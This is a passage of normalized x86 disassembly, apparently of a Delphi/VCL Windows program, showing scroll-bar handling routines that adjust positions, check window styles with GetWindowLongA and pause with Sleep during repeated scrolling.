pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46675d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
sub_466768
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_466790
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_466801
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_466768
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466808
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
sub_466810
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403280
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4668a0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418fac
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_467168
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_467148
mov edx [ edi + 0xc ]
mov eax ebx
call sub_466ff8
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4668f0
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_466aa8
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_44fee0
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_466ff8
xor edx edx
mov eax ebx
call sub_466ff8
jmp r-xdata
sub_466928
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42a11c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_466994
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42a11c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_4669fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_467130
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_452d84
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_467130
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_452d48
call sub_466994
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_452d48
call sub_466928
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_466aa8
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_456054
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_466ae0
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_456054
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_466b14
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_466ae0
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_466ae0
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_466b90
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_456054
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_466b14
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44f258
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_466b14
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44f29c
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_466c28
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_456054
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_466c88
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_466e59 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_466b90
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_466b90
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_466ff8
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
push ebp
call sub_466c28
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
push ebp
call sub_466c28
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406c7c
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_466ff8
jmp r-xdata
sub_466f80
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_467670
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_466ff8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_456054
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_456054
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_455c0c
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_455c0c
jmp r-xdata
call sub_466768
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4670bc
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_467670
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_467174
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_456054
push eax
call sub_42c2f8
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_456054
push eax
call sub_42c2f8
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_456054
push eax
call sub_42c2f8
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_423f34
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_456054
push eax
call sub_42c2f8
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_456054
push eax
call sub_42c2f8
sub_46727c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_466b90
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_466b90
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_467174
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_456054
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_466ff8
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_466b90
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_467394
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_451d80
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_466810
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_466810
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_46740c
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_4032b0
mov eax [ esi + 0x20c ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_451ea4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_467458
push ebx
mov ebx eax
mov eax ebx
call sub_45300c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_467670
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40c30c
test al al
jne r-xdata
mov eax ebx
call sub_456054
push eax
call sub_42c32c
sub_467498
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4675f0
mov ecx edi
mov edx esi
mov eax ebx
call sub_452754
pop edi
pop esi
pop ebx
retn
sub_4674d8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4675e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44f258
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_466aa8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_452d84
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_466ff8
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452d48
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452d48
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_418854
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_44efc4
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4675e7
mov eax [ ebp - 0x10 ]
call sub_4032b0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4668f0
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4189b0
xor ecx ecx
mov edx 0xb03e
call sub_450a20
inc ebx
dec esi
jne r-xdata
sub_467614
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_467148
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_467148
mov eax ebx
call sub_4675f0
jmp r-xdata
sub_467670
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_456358
test al al
je r-xdata
xor eax eax
push ebp
push sub_46775b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_466c10
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_466c10
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_46727c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_46727c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_46727c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_46727c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_46727c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_46727c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_467780
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_44f36c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_44f398
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_44f36c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_44f398
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_44f258
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_466ff8
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_44f258
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_44f29c
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_466ff8
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_44f258
